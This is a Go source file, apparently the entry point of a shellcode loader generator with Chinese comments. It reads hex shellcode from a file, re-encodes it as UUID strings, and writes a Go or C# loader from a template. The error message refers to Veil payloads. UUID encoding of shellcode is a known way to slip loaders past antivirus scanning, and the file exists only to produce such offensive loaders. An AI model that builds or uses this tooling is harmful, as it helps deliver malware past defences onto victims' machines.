package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"loader/genshellcode"
	"log"
	"strings"
)

var (
	srcFile    string
	desFile    string
	loaderType string
)

func init() {
	flag.StringVar(&srcFile, "s", "", "shellcode源文件，以\\x分隔的txt文件")
	flag.StringVar(&desFile, "d", "", "根据模板输出的loader文件")
	flag.StringVar(&loaderType, "t", "go", "生成loader文件的模板,默认为go，目前支持go、csharp")
	flag.Parse()
}

func main() {

	if srcFile == "" {
		log.Fatal("[-]未指定源文件.")
	}

	data, err := ioutil.ReadFile(srcFile)
	if err != nil {
		fmt.Println("veil文件打开出错")
	}

	string_shellcode := string(data)
	replace_shellcode := strings.Replace(string_shellcode, "\\x", "", -1)
	shellcode, _ := hex.DecodeString(replace_shellcode)

	uuids, _ := genshellcode.Shellcode2Uuids(shellcode)

	//genshellcode.WriteFile(desFile, uuids)

	genshellcode.WriteLoader(desFile, loaderType, uuids)

}
